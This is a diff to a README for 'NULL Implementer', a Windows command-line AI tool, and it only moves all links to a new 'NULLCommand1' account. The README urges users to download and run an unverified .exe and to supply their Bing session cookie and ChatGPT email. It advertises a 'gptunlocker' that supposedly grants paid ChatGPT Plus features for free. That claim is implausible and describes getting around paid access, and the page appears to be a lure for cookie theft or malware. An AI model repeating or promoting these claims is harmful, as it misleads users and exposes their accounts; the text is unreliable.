@@ -2,7 +2,7 @@
 ## Overview
 **NULL Implementer** is an artificial intelligence assistant program developed to operate within the Windows CMD command-line environment. It has the capability to generate text responses for tasks such as answering questions, researching resources (which may include code files, .pdf documents, .docx files, .xlsx spreadsheets, or even content from any website URL), and creating instant images based on text ideas provided by the user. Additionally, it features a highly useful unlocker for users of the ChatGPT tool, enabling quick access to Plus functions on a standard ChatGPT account. **NULL Implementer** offers a flexible user experience directly on a command-line-only platform.
 
-![NULL Implementer](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/main.jpg)
+![NULL Implementer](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/main.jpg)
 
 The **NULL Implementer** operates based on the robust foundation of the popular GitHub repository [xtekky/gpt4free](https://github.com/xtekky/gpt4free). This repository serves as a crucial core, the heart of the program, providing essential modules for its functionality and long-term development. To learn more about this repository, please refer to [here](https://github.com/xtekky/gpt4free).
 
@@ -12,7 +12,7 @@ The **NULL Implementer** operates based on the robust foundation of the popular 
 - **AI Image Generation**: Allows you to submit your image idea as text, then generates an image based on your idea and returns the result as a cloud-based image link.
 - **ChatGPT Plus Feature Unlocker**: Allows you to unlock and use ChatGPT Plus features on a standard account (each instance lasts between 10 - 15 minutes), simply by providing your ChatGPT account email address and the program will handle the rest.
 
-![Features](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/features.png)
+![Features](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/features.png)
 
 ## Getting Started
 To quickly start using **NULL Implementer**, follow these steps:
@@ -22,19 +22,19 @@ To quickly start using **NULL Implementer**, follow these steps:
     ```bash
     null-implementer config --browser firefox --bingcookie "" --lang "English"
     ```
-    ![Features](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/demo_1_getting_started.png)
+    ![Features](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/demo_1_getting_started.png)
 3. Try asking your first question:
     ```bash
     null-implementer research --prompt "Who are you?"
     ```
-    ![Features](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/demo_2_getting_started.png)
+    ![Features](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/demo_2_getting_started.png)
 
-[Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/demo_1_getting_started.mp4)
+[Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/demo_1_getting_started.mp4)
 
 ## Installation
 To install NULL Implementer, follow these steps:
 1. **Download the Release**:
-- Go to the [Releases](https://github.com/NULLCommand-Restructuring/NULLImplementer/releases) page of this repository.
+- Go to the [Releases](https://github.com/NULLCommand1/NULLImplementer/releases) page of this repository.
 - Download the latest version of the `null-implementer.exe` file.
 2. **Add `null-implementer.exe` to Path Environment**:
 - Move the downloaded `null-implementer.exe` file to a directory that is included in the system’s PATH environment variable.
@@ -48,7 +48,7 @@ To install NULL Implementer, follow these steps:
     - Click **OK** to close all dialog boxes.
 3. **Verify the Installation**:
 - Open a CMD window in Windows and type `null-implementer --version`. If it displays version information, then everything is set up correctly.
-![Version](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/version.png)
+![Version](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/version.png)
 
 ## System Requirements
 - **Operating System**: Windows 10 or later.
@@ -60,13 +60,13 @@ To install NULL Implementer, follow these steps:
     ```bash
     null-implementer config
     ```
-    ![Config Default](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/config_default.png)
+    ![Config Default](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/config_default.png)
 
 - If you prefer to use **NULL Implementer** with your own custom configuration (make sure you understand it and know what you’re doing), simply pass the corresponding arguments:
     ```bash
     null-implementer config --browser [your_browser_type] --bingcookie [your_bing_cookie] --lang [your_language] --gptemail [your_email_gpt_account]
     ```
-    ![Config Detail](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/config_detail.png)
+    ![Config Detail](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/config_detail.png)
 - Note: You need to fully configure the **NULL Implementer** before using it to perform any tasks. You can either run the command using the default configuration quickly or configure it fully according to your own preferences.
 
 ## How to Use
@@ -76,51 +76,51 @@ To install NULL Implementer, follow these steps:
     ```bash
     null-implementer research --prompt "questions_you_need_answered"
     ```
-    ![Simple Research](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/simple_research_1.png)
-[Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/simple_research_1.mp4)
+    ![Simple Research](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/simple_research_1.png)
+[Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/simple_research_1.mp4)
 
 - You can provide a text file (.txt, .docx, .pdf, ...) or source code (.html, .js, .py, ...) by specifying its path on your local machine or its cloud link using `--resource` after the `research` option. Then, request the AI to address a question related to the provided resource as follows:
     ```bash
     null-implementer research --resource [your_path_pdf] [your_path_docx] ... --prompt "questions_you_need_answered"
     ```
-    ![Resource Research](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/resource_research_1.png)
+    ![Resource Research](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/resource_research_1.png)
 
-    [Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/resource_research_1.mp4)
+    [Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/resource_research_1.mp4)
 
 - You can also provide a cloud resource, such as a website or a cloud link, as long as it is accessible through a browser. Then, request the AI to address a question related to that cloud resource as follows:
     ```bash
     null-implementer research --resource [your_url_1] [your_url_2] ... --prompt "questions_you_need_answered"
     ```
-    ![Web Research](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/web_research_1.png)
+    ![Web Research](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/web_research_1.png)
 
-    [Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/web_research_1.mp4)
+    [Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/web_research_1.mp4)
 
 - For a general case that can apply to the previously mentioned scenarios, when your question is quite complex and cannot be directly expressed in a single CMD line, you can enter the question into a text file (.txt) (e.g., `question.txt`) and then execute the following command:
     ```bash
     null-implementer research --resource [your_url_1] [your_url_2] ... --prompt "your_path_question_txt"
     ```
-    ![Question File](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/question_file_1.png)
+    ![Question File](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/question_file_1.png)
 
-    [Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/question_file_1.mp4)
+    [Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/question_file_1.mp4)
 ### `imager` Option
 - You can provide an idea for the image you want to create and let **NULL Implementer**'s AI image generator handle the rest:
     ```bash
     null_implementer imager --prompt "your_image_idea"
     ```
-    ![Imager Demo](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/imager_demo.png)
-    [Click here to watch the demo video for this feature.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/imager_demo.mp4)
+    ![Imager Demo](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/imager_demo.png)
+    [Click here to watch the demo video for this feature.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/imager_demo.mp4)
 ### `gptunlocker` Option
 
 - You have a regular ChatGPT account and you want to access the Plus features, but your financial situation doesn't allow it. Provide **NULL Implementer** with your ChatGPT account email address and let it unlock the Plus features for you by executing the following command:
     ```bash
     null-implementer gptunlocker --email "your_email_gpt_account"
     ```
-    ![GPT Plus Unlocker](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/gptunlocker_demo.png)
-    [Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/gptunlocker_demo.mp4)
+    ![GPT Plus Unlocker](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/gptunlocker_demo.png)
+    [Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/gptunlocker_demo.mp4)
 
 - You can omit the `--email` parameter, in which case **NULL Implementer** will use the default value configured in the `config` option. Execute the following command:
     ```bash
     null-implementer gptunlocker 
     ```
-    ![GPT Plus Unlocker](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/gptunlocker_demo_1.png)
-    [Click here to view the demo video for this section.](https://nullcommand-restructuring.github.io/NULLCommand-Restructuring/NULLImplementer-DemoResources/gptunlocker_demo_1.mp4)
+    ![GPT Plus Unlocker](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/gptunlocker_demo_1.png)
+    [Click here to view the demo video for this section.](https://nullcommand1.github.io/NULLCommand1/NULLImplementer-DemoResources/gptunlocker_demo_1.mp4)
